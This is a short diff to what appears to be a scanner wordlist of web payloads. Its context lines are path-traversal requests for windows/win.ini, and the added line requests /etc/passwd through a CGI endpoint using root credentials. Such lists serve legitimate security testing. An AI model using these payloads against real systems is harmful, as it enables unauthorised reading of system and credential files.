@@ -861,3 +861,4 @@
 /..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini
 /..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
 /../../../../../../windows/win.ini
+/cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd
